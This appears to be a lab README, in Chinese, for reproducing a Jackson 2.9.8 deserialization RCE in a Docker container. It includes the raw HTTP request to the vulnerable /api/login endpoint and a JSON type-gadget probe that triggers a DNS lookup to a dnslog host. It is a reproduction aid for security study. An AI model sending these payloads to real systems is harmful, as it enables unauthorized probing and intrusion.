# lab

## jackson rce复现
jackson版本为2.9.8

```
docker build -t jackson_rce .
docker run -p 8090:8090 jackson_rce
```
访问
http://127.0.0.1:8090
登录包存在漏洞
```
POST /api/login HTTP/1.0
Host: 127.0.0.1:8090
Content-Type: application/json
Content-Length: 73

["java.net.InetAddress","dnslog地址"]
```

探测poc:
```
["java.net.InetAddress","dnslog地址"]
```
